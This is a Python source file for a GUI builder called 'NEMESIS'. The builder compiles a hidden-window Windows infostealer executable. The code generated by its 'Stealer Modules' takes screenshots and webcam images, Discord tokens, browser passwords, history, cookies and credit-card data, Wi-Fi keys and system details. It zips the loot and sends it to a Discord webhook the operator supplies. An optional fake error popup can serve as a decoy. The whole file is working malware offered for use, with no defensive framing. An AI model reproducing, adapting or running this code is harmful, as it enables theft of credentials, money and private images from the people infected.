# Nemesis_imgui.py - GLEICH WIE VORHER (VOLLSTÄNDIG)
import os, sys, random, json, threading, subprocess

try:
    import customtkinter as ctk
except:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "customtkinter"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    import customtkinter as ctk

try:
    import requests
except:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    import requests

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")
OUTPUT_DIR = "build"

class PopupWindow(ctk.CTkToplevel):
    def __init__(self, parent):
        super().__init__(parent)
        self.title("Popup Settings"); self.geometry("350x220")
        self.resizable(False,False); self.grab_set()
        self.update_idletasks()
        w=(self.winfo_screenwidth()-350)//2; h=(self.winfo_screenheight()-220)//2
        self.geometry(f"+{w}+{h}")
        ctk.CTkLabel(self,text="Popup Settings",font=("Arial",18,"bold")).pack(pady=12)
        self.ti=ctk.CTkEntry(self,width=280,placeholder_text="Title"); self.ti.pack(pady=4)
        self.mi=ctk.CTkEntry(self,width=280,placeholder_text="Message"); self.mi.pack(pady=4)
        ctk.CTkButton(self,text="Save",command=self.save).pack(pady=12)
        self.parent=parent
    def save(self): self.parent.popup_title=self.ti.get(); self.parent.popup_text=self.mi.get(); self.destroy()

class NemesisApp(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("NEMESIS"); self.geometry("580x680"); self.resizable(False,False)
        self.update_idletasks()
        w=(self.winfo_screenwidth()-580)//2; h=(self.winfo_screenheight()-680)//2
        self.geometry(f"+{w}+{h}")
        self.popup_title=""; self.popup_text=""
        
        ctk.CTkLabel(self,text="NEMESIS",font=("Arial",50,"bold"),text_color="#FF0000").pack(pady=8)
        
        wf=ctk.CTkFrame(self); wf.pack(pady=5,padx=15,fill="x")
        ctk.CTkLabel(wf,text="Webhook:",font=("Arial",12)).pack(side="left",padx=5)
        self.we=ctk.CTkEntry(wf,placeholder_text="discord.com/api/webhooks/...",width=280); self.we.pack(side="left",padx=5)
        ctk.CTkButton(wf,text="Test",width=50,command=lambda:threading.Thread(target=self.test,daemon=True).start()).pack(side="left",padx=5)
        
        of=ctk.CTkFrame(self); of.pack(pady=5,padx=15,fill="both",expand=True)
        ctk.CTkLabel(of,text="Stealer Modules",font=("Arial",14,"bold")).pack(pady=3)
        
        self.cb={}
        opts=[
            "Screenshot","Camera","Discord Token (PS)",
            "Browser Passwords","Browser History","Browser Cookies","Browser Credit Cards",
            "System Info","Wifi Passwords","Installed Programs","Popup"
        ]
        for name in opts:
            row=ctk.CTkFrame(of); row.pack(pady=1,padx=10,fill="x")
            self.cb[name]=ctk.CTkCheckBox(row,text=name,font=("Arial",12)); self.cb[name].pack(side="left",padx=5)
            if name=="Popup": ctk.CTkButton(row,text="Config",width=55,height=16,command=self.open_popup).pack(side="left",padx=5)
        
        zf=ctk.CTkFrame(self); zf.pack(pady=3,padx=15,fill="x")
        ctk.CTkLabel(zf,text="ZIP Name:",font=("Arial",11)).pack(side="left",padx=5)
        self.zn=ctk.CTkEntry(zf,placeholder_text="NEMESIS",width=120); self.zn.pack(side="left",padx=5); self.zn.insert(0,"NEMESIS")
        
        nf=ctk.CTkFrame(self); nf.pack(pady=3,padx=15,fill="x")
        ctk.CTkLabel(nf,text="EXE Name:",font=("Arial",11)).pack(side="left",padx=5)
        self.ne=ctk.CTkEntry(nf,placeholder_text="client.exe",width=120); self.ne.pack(side="left",padx=5); self.ne.insert(0,"client.exe")
        
        ctk.CTkButton(self,text="BUILD EXE",font=("Arial",15,"bold"),height=38,command=self.start_build).pack(pady=5)
        self.st=ctk.CTkLabel(self,text="",font=("Arial",10),text_color="#00FF00"); self.st.pack(pady=3)
    
    def open_popup(self): PopupWindow(self)
    def test(self):
        url=self.we.get().strip()
        self.after(0,lambda:self.st.configure(text="Testing...",text_color="yellow"))
        try:
            r=requests.post(url,json={"content":"NEMESIS Test OK"},timeout=10)
            self.after(0,lambda:self.st.configure(text="Test OK!" if r.status_code==204 else f"Code:{r.status_code}",text_color="#00FF00" if r.status_code==204 else "red"))
        except: self.after(0,lambda:self.st.configure(text="Test failed!",text_color="red"))
    def start_build(self):
        self.st.configure(text="Building...",text_color="yellow"); self.update()
        threading.Thread(target=self.build,daemon=True).start()
    
    def build(self):
        os.makedirs(OUTPUT_DIR,exist_ok=True)
        wh=self.we.get().strip(); zn=self.zn.get().strip() or "NEMESIS"
        L=[]
        L.append("import os,re,json,sqlite3,shutil,tempfile,zipfile,socket,getpass,platform,threading,subprocess")
        L.append("from datetime import datetime")
        L.append("try:import requests\nexcept:pass")
        L.append("try:from PIL import ImageGrab\nexcept:pass")
        L.append("try:import cv2\nexcept:pass")
        L.append(f'WH="{wh}"'); L.append(f'ZN="{zn}"')
        L.append("pc=socket.gethostname()"); L.append("user=getpass.getuser()")
        L.append('os_info=platform.system()+" "+platform.release()')
        L.append('dt=datetime.now().strftime("%Y-%m-%d %H:%M:%S")')
        L.append('ip="N/A"')
        L.append("try:\n import urllib.request\n ip=urllib.request.urlopen(urllib.request.Request('https://api.ipify.org'),timeout=5).read().decode()\nexcept:pass")
        L.append("logs={}")
        L.append("def send_msg(t):\n if not WH:return\n try:\n  import urllib.request\n  for i in range(0,len(t),1900):\n   d=json.dumps({'content':t[i:i+1900]}).encode()\n   urllib.request.urlopen(urllib.request.Request(WH,data=d,headers={'Content-Type':'application/json'}),timeout=10)\n except:pass")
        L.append("def send_zip(p):\n if not WH or not os.path.exists(p):return\n try:\n  with open(p,'rb') as f:requests.post(WH,files={'file':(ZN+'.zip',f,'application/zip')})\n except:pass")
        L.append('send_msg(f"**NEMESIS**\\n```\\nPC: {pc}\\nUser: {user}\\nOS: {os_info}\\nIP: {ip}\\nDate: {dt}\\n```")')
        
        if self.cb["Popup"].get():
            t=self.popup_title or "Error"; m=self.popup_text or "Error"
            L.append(f'import ctypes\nthreading.Thread(target=lambda:ctypes.windll.user32.MessageBoxW(0,"{m}","{t}",0),daemon=True).start()')
        if self.cb["Screenshot"].get(): L.append("try:\n ss=ImageGrab.grab()\n ss.save(os.path.join(tempfile.gettempdir(),'screenshot.png'))\n logs['Screenshot']=os.path.join(tempfile.gettempdir(),'screenshot.png')\nexcept:pass")
        if self.cb["Camera"].get(): L.append("try:\n cam=cv2.VideoCapture(0)\n r,fr=cam.read()\n if r:cv2.imwrite(os.path.join(tempfile.gettempdir(),'camera.png'),fr)\n logs['Camera']=os.path.join(tempfile.gettempdir(),'camera.png')\n cam.release()\nexcept:pass")
        if self.cb["System Info"].get(): L.append("logs['System']=f'PC: {pc}\\nUser: {user}\\nOS: {os_info}\\nIP: {ip}\\nDate: {dt}'")
        if self.cb["Discord Token (PS)"].get(): L.append("D=['discord','discordcanary','discordptb']\ntokens=set()\nfor dn in D:\n dp=os.path.join(os.getenv('APPDATA'),dn,'Local Storage','leveldb')\n if os.path.exists(dp):\n  for f in os.listdir(dp):\n   if f.endswith(('.ldb','.log')):\n    try:\n     with open(os.path.join(dp,f),'r',errors='ignore') as fp:\n      for t in re.findall(r'[\\w-]{24,26}\\.[\\w-]{6,7}\\.[\\w-]{27,40}',fp.read()):tokens.add(t)\n    except:pass\nif tokens:logs['Discord']='\\n'.join(tokens)")
        if self.cb["Browser Passwords"].get(): L.append("try:\n pwds=[]\n local=os.getenv('LOCALAPPDATA')\n for bn,bp in[('Chrome',os.path.join(local,'Google','Chrome','User Data')),('Edge',os.path.join(local,'Microsoft','Edge','User Data')),('Brave',os.path.join(local,'BraveSoftware','Brave-Browser','User Data')),('Opera',os.path.join(os.getenv('APPDATA'),'Opera Software','Opera Stable')),('Vivaldi',os.path.join(local,'Vivaldi','User Data')),('Yandex',os.path.join(local,'Yandex','YandexBrowser','User Data')),('Chromium',os.path.join(local,'Chromium','User Data'))]:\n  if not os.path.exists(bp):continue\n  l=os.path.join(bp,'Default','Login Data')\n  if not os.path.exists(l):\n   for pr in os.listdir(bp):\n    if os.path.exists(os.path.join(bp,pr,'Login Data')):l=os.path.join(bp,pr,'Login Data');break\n  if not os.path.exists(l):continue\n  tmp=os.path.join(tempfile.gettempdir(),'l.db');shutil.copy2(l,tmp)\n  c=sqlite3.connect(tmp);cur=c.cursor()\n  cur.execute('SELECT origin_url,username_value,password_value FROM logins')\n  for url,user,pwd in cur.fetchall():\n   if user:pwds.append('['+bn+'] '+str(url)+'|'+str(user)+'|'+str(pwd)[:50])\n  c.close();os.remove(tmp)\n if pwds:logs['Passwords']='\\n'.join(pwds)\nexcept:pass")
        if self.cb["Browser History"].get(): L.append("try:\n hist=[]\n local=os.getenv('LOCALAPPDATA')\n for bn,bp in[('Chrome',os.path.join(local,'Google','Chrome','User Data')),('Edge',os.path.join(local,'Microsoft','Edge','User Data')),('Brave',os.path.join(local,'BraveSoftware','Brave-Browser','User Data')),('Opera',os.path.join(os.getenv('APPDATA'),'Opera Software','Opera Stable')),('Vivaldi',os.path.join(local,'Vivaldi','User Data')),('Yandex',os.path.join(local,'Yandex','YandexBrowser','User Data')),('Chromium',os.path.join(local,'Chromium','User Data'))]:\n  if not os.path.exists(bp):continue\n  hdb=os.path.join(bp,'Default','History')\n  if not os.path.exists(hdb):continue\n  tmp=os.path.join(tempfile.gettempdir(),'h.db');shutil.copy2(hdb,tmp)\n  c=sqlite3.connect(tmp);cur=c.cursor()\n  cur.execute('SELECT url,title FROM urls LIMIT 100')\n  for url,title in cur.fetchall():\n   if url:hist.append('['+bn+'] '+url+'|'+(title or 'N/A'))\n  c.close();os.remove(tmp)\n if hist:logs['History']='\\n'.join(hist)\nexcept:pass")
        if self.cb["Browser Cookies"].get(): L.append("try:\n cks=[]\n local=os.getenv('LOCALAPPDATA')\n for bn,bp in[('Chrome',os.path.join(local,'Google','Chrome','User Data')),('Edge',os.path.join(local,'Microsoft','Edge','User Data')),('Brave',os.path.join(local,'BraveSoftware','Brave-Browser','User Data')),('Opera',os.path.join(os.getenv('APPDATA'),'Opera Software','Opera Stable')),('Vivaldi',os.path.join(local,'Vivaldi','User Data')),('Yandex',os.path.join(local,'Yandex','YandexBrowser','User Data')),('Chromium',os.path.join(local,'Chromium','User Data'))]:\n  if not os.path.exists(bp):continue\n  l=os.path.join(bp,'Default','Cookies')\n  if not os.path.exists(l):continue\n  tmp=os.path.join(tempfile.gettempdir(),'c.db');shutil.copy2(l,tmp)\n  c=sqlite3.connect(tmp);cur=c.cursor()\n  cur.execute('SELECT host_key,name FROM cookies LIMIT 50')\n  for h,n in cur.fetchall():\n   if h and n:cks.append('['+bn+'] '+h+'|'+n)\n  c.close();os.remove(tmp)\n if cks:logs['Cookies']='\\n'.join(cks)\nexcept:pass")
        if self.cb["Browser Credit Cards"].get(): L.append("try:\n ccs=[]\n local=os.getenv('LOCALAPPDATA')\n for bn,bp in[('Chrome',os.path.join(local,'Google','Chrome','User Data')),('Edge',os.path.join(local,'Microsoft','Edge','User Data'))]:\n  if not os.path.exists(bp):continue\n  wd=os.path.join(bp,'Default','Web Data')\n  if not os.path.exists(wd):continue\n  tmp=os.path.join(tempfile.gettempdir(),'cc.db');shutil.copy2(wd,tmp)\n  c=sqlite3.connect(tmp);cur=c.cursor()\n  cur.execute('SELECT name_on_card,expiration_month,expiration_year,card_number_encrypted FROM credit_cards')\n  for n,em,ey,cn in cur.fetchall():\n   if n:ccs.append('['+bn+'] '+str(n)+'|'+str(em)+'/'+str(ey)+'|'+str(cn)[:20])\n  c.close();os.remove(tmp)\n if ccs:logs['CreditCards']='\\n'.join(ccs)\nexcept:pass")
        if self.cb["Wifi Passwords"].get(): L.append("try:\n wf=[]\n r=subprocess.check_output('netsh wlan show profiles',shell=True,encoding='utf-8',errors='ignore')\n for l in r.split('\\n'):\n  if ':' in l:\n   s=l.split(':')[1].strip()\n   if s:\n    i=subprocess.check_output(f'netsh wlan show profile \"{s}\" key=clear',shell=True,encoding='utf-8',errors='ignore')\n    for x in i.split('\\n'):\n     if 'Key Content' in x or 'Schlusselinhalt' in x:wf.append(s+' : '+x.split(':')[1].strip())\n if wf:logs['WiFi']='\\n'.join(wf)\nexcept:pass")
        if self.cb["Installed Programs"].get(): L.append("try:\n pr=[]\n r=subprocess.check_output('wmic product get name',shell=True,encoding='utf-8',errors='ignore')\n for l in r.split('\\n'):\n  l=l.strip()\n  if l and l!='Name':pr.append(l)\n if pr:logs['Programs']='\\n'.join(pr[:200])\nexcept:pass")
        
        L.append("if logs:\n zp=os.path.join(tempfile.gettempdir(),'data.zip')\n with zipfile.ZipFile(zp,'w',zipfile.ZIP_DEFLATED) as zf:\n  for k,v in logs.items():\n   if k in['Screenshot','Camera'] and os.path.exists(v):zf.write(v,os.path.basename(v))\n   else:zf.writestr(k+'.txt',str(v))\n send_zip(zp)\n os.remove(zp)\n for k,v in logs.items():\n  if k in['Screenshot','Camera'] and os.path.exists(v):os.remove(v)")
        
        with open("_temp.py","w",encoding="utf-8") as f:f.write("\n".join(L))
        subprocess.run(f'"{sys.executable}" -m PyInstaller --onefile --noconsole --clean --hidden-import requests --hidden-import urllib.request --hidden-import PIL --hidden-import cv2 --distpath {OUTPUT_DIR} --workpath _tmp --specpath _tmp _temp.py',shell=True,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        try:os.remove("_temp.py")
        except:pass
        try:shutil.rmtree("_tmp",ignore_errors=True)
        except:pass
        en=self.ne.get().strip() or "client.exe"
        if not en.endswith(".exe"):en+=".exe"
        src=os.path.join(OUTPUT_DIR,"_temp.exe"); dst=os.path.join(OUTPUT_DIR,en)
        if os.path.exists(src):
            if os.path.exists(dst):os.remove(dst)
            os.rename(src,dst)
            self.after(0,lambda:self.st.configure(text=f"Done! build/{en} ({os.path.getsize(dst)//1024}KB)",text_color="#00FF00"))
        else:self.after(0,lambda:self.st.configure(text="Build failed!",text_color="red"))

if __name__=="__main__":
    app=NemesisApp(); app.mainloop()